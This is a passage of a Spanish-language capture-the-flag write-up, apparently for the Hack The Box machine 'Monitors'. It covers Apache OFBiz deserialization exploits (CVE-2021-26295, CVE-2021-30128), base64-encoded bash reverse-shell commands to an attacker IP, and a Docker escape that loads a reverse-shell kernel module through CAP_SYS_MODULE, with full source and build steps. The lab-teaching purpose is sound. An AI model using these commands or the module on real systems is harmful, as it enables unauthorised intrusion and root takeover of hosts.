![341page8443localhost_content](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341page8443localhost_content.png)

Opa, encontramos un servicio llamado **Apache OFBiz** ([app para automatizar muchos procesos de empresariales](https://es.wikipedia.org/wiki/Apache_OFBiz)), en su versi√≥n `17.12.01` (abajo a la derecha esta)...

Tenemos un login panel, probando con las credenciales que no tenemos no conseguimos acceder, as√≠ que busquemos vulnerabilidades contra esa versi√≥n de **Apache OFBiz**...

Encontramos dos recientes y con alto grado de da√±o:

![341google_cvedetails_ofbiz](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341google_cvedetails_ofbiz.png)

**Claramente la roja es m√°s llamativa (e.e), pero en su momento en mi b√∫squeda ca√≠ primero en el segundo CVE, ese fue mi punto de partida.**

üöÄ **<u>Desde ya digo que el CVE </u>[CVE-2021-26295](https://www.cvedetails.com/cve/CVE-2021-26295/)<u> no me funciono para esta m√°quina, peeeeero de √©l obtenemos algo esencial para usar con el CVE </u>[CVE-2021-30128](https://www.cvedetails.com/cve/CVE-2021-30128/)**.

...

## <u>CVE-2021-26295</u> - No del todo Fail [üìå](#cve-2021-26295) {#cve-2021-26295}

> Vamos a hacer este apartado cortico :P Mostrare un exploit que estuvo interesante y el **CASI pero no** *RCE*. Adem√°s tomaremos un ejemplo del propio creador del exploit para aplicarlo al otro **CVE**, esto para finalmente conseguir **RCE**.

El **CVE** nos habla de una vuln de las divertidas, una [**deserializacion insegura**](https://hackingprofessional.github.io/Security/Aprende-que-es-Deserializacion-Insegura-OWASP-VII/) que nos puede resultar en **ejecuci√≥n remota de comandos** sin necesidad de estar autenticados, en este caso afectando la clase `java.rmi.server` de **Java**. 

**Ac√° analizan 3 CVEs, entre ellos los 2 que tocaremos:**

* [**Apache OFBiz** Analysis (CVE-2021-26295, CVE-2021-29200, CVE-2021-30128)](https://ridgesecurity.ai/blog/apache-ofbiz-three-deserialization-vulnerabilities-analysis-cve-2021-26295-cve-2021-29200-cve-2021-30128/).

> La serializacion se basa en convertir un objeto en un formato de datos especifico. Y la deserializacion es tomar esos datos serializados y convertirlos en un objeto.

Bien, navegando ca√≠ en este repo:

* [https://github.com/r0ckysec/CVE-2021-26295](https://github.com/r0ckysec/CVE-2021-26295).

Podemos alistar el traductor para jugar con toooodo el chino que hay escrito (:

... Despu√©s de muuuuuuuuchas pruebas entendemos como funciona y que debemos hacer para probarlo correctamente...

El script genera un archivo malicioso serializado, toma su contenido y lo env√≠a al apartado web vulnerable (`https://localhost:8443/webtools/control/SOAPService`), si todo va bien, la respuesta de la web deber√≠a ser una petici√≥n hacia un listener que debemos tener activo y ese listener nos permitir√° indicar que comando queremos que ejecute el sistema para nosotros...

La descripci√≥n del exploit nos da los pasos necesarios a ejecutar:

<span style="color: blue;">1. </span>Debemos ponernos en escucha mediante el listener [**JRMP**](https://itqna.net/questions/22426/what-difference-between-rmi-and-jrmp) Listener por alg√∫n puerto, en este caso el **9999** e indicarle que comando queremos que se ejecute una vez hayamos recibido la petici√≥n hecha por el script:

```bash
‚ù± java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsBeanutils1 'bash -i >& /dev/tcp/10.10.14.146/4450'
```

> Usamos [ysoserial](https://github.com/frohoff/ysoserial), que es una herramienta que explota vaaaarias vulns de deserializacion de objetos en **Java**.

<span style="color: blue;">2. </span>Nos ponemos en escucha por el puerto **4450** (en mi caso):

```bash
‚ù± nc -lvp 4450
```

<span style="color: blue;">3. </span>Finalmente lanzamos el exploit:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_CVE_2020_26295_fail.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Recibimos la petici√≥n en el listener del **ysoserial**, pero no nos ejecuta comandos üá´

Si revisamos el ejemplo del creador del script nos da otra forma de ejecutar comandos:

![341google_repo_CVE2020_26295_commandWITHpipes](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341google_repo_CVE2020_26295_commandWITHpipes.png)

<div style="text-align: center;">

<a href="https://github.com/r0ckysec/CVE-2021-26295">https://github.com/r0ckysec/CVE-2021-26295</a>

</div>

Al parecer encodea en **base64** el comando que quiere ejecutar (en su caso una reverse Shell) y lo env√≠a al sistema en un formato (que no hab√≠a visto antes, pero se entiende lo que hace) distinto al de siempre, pues intentemos hacer la ejecuci√≥n de comandos de esa forma:

```bash
‚ù± echo "bash -i >& /dev/tcp/10.10.14.146/4450 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDYvNDQ1MCAwPiYxCg==
```

Y lo que pasar√≠amos seria:

```bash
'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDYvNDQ1MCAwPiYxCg==}|{base64,-d}|{bash,-i}'
```

Pues:

![341bash_CVE_2020_26295_base64_fail](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_CVE_2020_26295_base64_fail.png)

Tampoco nos funciona (:

Ac√° fue cuando record√© el otro **CVE**, as√≠ que me fui a buscar info sobre √©l.

...

## <u>CVE-2021-30128</u> - Tamos dentro del container [üìå](#cve-2021-30128) {#cve-2021-30128}

Hay poca info de este CVE y las descripciones no ayudan, en la mayor√≠a de casos encontramos:

üëé ***Apache OFBiz has unsafe deserialization prior to 17.12.07 versi√≥n***

Pues ac√° volvemos a encontrarnos con el an√°lisis a los 3 CVEs, entre ellos el que vamos a usar ahora:

* [**Apache OFBiz** Analysis (CVE-2021-26295, CVE-2021-29200, CVE-2021-30128)](https://ridgesecurity.ai/blog/apache-ofbiz-three-deserialization-vulnerabilities-analysis-cve-2021-26295-cve-2021-29200-cve-2021-30128/).

En ella nos explica la vuln:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341google_analysisCVEs_30128.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Perfectooooo, pues buscando exploits relacionados caemos en 2:

* [https://github.com/r0ckysec/CVE-2021-30128](https://github.com/r0ckysec/CVE-2021-30128).
* [https://github.com/LioTree/CVE-2021-30128-EXP](https://github.com/LioTree/CVE-2021-30128-EXP).

El uso de los dos es muy sencillo, pasamos el objetivo y el comando que queremos ejecutar...

Probando con los dos script cosas como:

```bash
‚ù± python3 cve-2021-30128_exp.py https://localhost:8443 'bash -i >& /dev/tcp/10.10.14.146/4450 0>&1'
‚ù± python3 exp.py -u https://localhost:8443 -c 'bash -i >& /dev/tcp/10.10.14.146/4450 0>&1'
```

Incluso intentar jugar con `nc` o `ping`, pero nada, no conseguimos respuesta alguna...

Despu√©s de pensar mucho, (como una prueba de las que siempre hacemos) record√© lo usado en el script anterior, el tomar la cadena y pasarla a **base64** para despu√©s juntarla al formato raro.

Pues üï∫üèæ

```bash
‚ù± echo "bash -i >& /dev/tcp/10.10.14.146/4450 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDYvNDQ1MCAwPiYxCg==
```

... <u>AAAAAAAAAAAAaAAAAAAaa</u>


* [https://github.com/LioTree/CVE-2021-30128-EXP](https://github.com/LioTree/CVE-2021-30128-EXP).

---

```bash
‚ù± python3 exp.py -u https://localhost:8443 -c 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDYvNDQ1MCAwPiYxCg==}|{base64,-d}|{bash,-i}'
```

![341bash_repo_liotree_30128_revsh](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_repo_liotree_30128_revsh.png)

... <u>AAAAAAAAAaAAAaaAaaaaA</u>

* [https://github.com/r0ckysec/CVE-2021-30128](https://github.com/r0ckysec/CVE-2021-30128).

---

```bash
‚ù± python3 cve-2021-30128_exp.py https://localhost:8443 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDYvNDQ1MCAwPiYxCg==}|{base64,-d}|{bash,-i}'
```

![341bash_repo_r0ckysec_30128_revsh](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_repo_r0ckysec_30128_revsh.png)

¬°TAMOS DENTRO DEL CONTAINEEEEEEEEEEEEEEEEEEEEER!!

¬°Y CON CUALQUIERAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!!

¬°Y USANDO ALGO EXTRA√ëOOOOOOOOOOOOOOOOOOO DEL ANTERIOR CVEEEEEE!!

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341google_gif_yeahbirthday.gif" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width:100%;"/>

Ahora s√≠, tomemos agua, estir√©monos, pongamos la terminal bonita y a seguir (:

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Buscando en el contenedor hab√≠a unos archivos medio sospechosos o con nombres interesantes, pero no lograba enfocar alg√∫n m√©todo de explotaci√≥n, leyendo esta gu√≠a:

* [Docker Breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout).

Tenemos varias opciones para probar contra un contenedor, esto con la idea de escapar de √©l y llegar al sistema host que lo sostiene...

En una de las pruebas, caemos ac√°:

* [Docker Breakout - Container Capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#container-capabilities).

En el que buscamos **5** [capabilities](http://www.etl.it.uc3m.es/Linux_Capabilities) en concreto, si el contenedor cuenta con al menos una de ellas, tenemos un vector para escapar de √©l.

üèÉ‚Äç‚ôÄÔ∏è ***You should check the capabilities of the container, if it has any of the following ones, <u>you might be able to scape from it</u>: `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `DAC_READ_SEARCH`, `DAC_OVERRIDE`***.

Para listar las **capabilities** usamos:

```bash
root@9092a1174332:/$ capsh --print
```

![341bash_dockerSH_capshPRINT](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_dockerSH_capshPRINT.png)

Opa, vemos una de las 5, `cap_sys_module` y esta activa :O pues sigamos la gu√≠a a ver como podemos explotar esta **cap**...

* [Docker Breakout - Container Capabilities - **CAP_SYS_MODULE**](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_module).

üò≤ ***This means that you can insert/remove kernel modules in/from kernel of the host machine*** üò≤

La explotaci√≥n es gracias al comando [modprobe](https://es.wikipedia.org/wiki/Modprobe) que busca dependencias y archivos de mapeo en el directorio `/lib/modules/$(uname -r)`, en nuestro caso:

```bash
root@9092a1174332:/$ echo "/lib/modules/$(uname -r)"
/lib/modules/4.15.0-142-generic
```

Entonces, para aprovecharnos de esto, necesitamos crear esa carpeta, compilar el m√≥dulo del kernel malicioso  y finalmente ejecutar el m√≥dulo, d√©mosle:

> Todos estos pasos son tomados de la propia guia.

<span style="color: red;">1. </span>Creamos el m√≥dulo del kernel que ejecutara la **reverse Shell**:

```bash
‚ù± cat rsh.c 
```

```bash
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("holis");
MODULE_AUTHOR("holiwis");
MODULE_DESCRIPTION("holanda");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.146/4434 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Nos enviar√° la petici√≥n al puerto **4434** de nuestro sistema.

<span style="color: red;">2. </span>Creamos el archivo [**Makefile**](https://blog.desdelinux.net/que-es-un-archivo-makefile-y-como-funciona-dentro-de-linux/) que ser√° el encargado de compilar el m√≥dulo:

> "The blank char before each `make` word in the Makefile **must be a tab, not spaces**!"

```bash
‚ù± cat Makefile
```

```bash
obj-m +=rsh.o

all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> El nombre del objeto es `rsh.o`, es importante para el √∫ltimo paso.

<span style="color: red;">3. </span>Compilamos el archivo **Makefile** con el comando `make`:

```bash
root@9092a1174332:/tmp/test$ ls -la
total 20
drwxr-xr-x 2 root root 4096 Jul  9 11:11 .
drwxrwxrwt 1 root root 4096 Jul  9 11:11 ..
-rw-r--r-- 1 root root  157 Jul  9 11:11 Makefile
-rw-r--r-- 1 root root  718 Jul  9 11:11 rsh.c
```

```bash
root@9092a1174332:/tmp/test$ make
make -C /lib/modules/4.15.0-142-generic/build M=/tmp/test modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
  CC [M]  /tmp/test/rsh.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /tmp/test/rsh.mod.o
  LD [M]  /tmp/test/rsh.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'
```

Listones, ya estar√≠a creado en el directorio `/lib/modules...`.

<span style="color: red;">4. </span>Nos ponemos en escucha por el puerto **4434**:

```bash
‚ù± nc -lvp 4434
```

<span style="color: red;">5. </span>Ejecutamos el m√≥dulo:

```bash
root@9092a1174332:/tmp/test$ insmod rsh.ko
```

Yyyyy...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341bash_dockerSH_execModule_RevSH_done.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width:100%;"/>

Perfect√≠simoooooooooooooooooo, estamos dentro del host como el usuario **root** (: veamos las flags...

![341flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitors/341flags.png)

YYYYY fin.

...

Linda m√°quina, me encanto que fue full vulnerabilidades reales, muchos **CVE** (bueno lo de la contrase√±a de **marcus** fue un poco keloke) 

**Muy divertida, linda linda.**

Hemos terminado por hoy, nos leeremos despu√©s y lo que no puede faltar. A SEGUIR ROMPIENDO TODOOOOOOOOOOO!!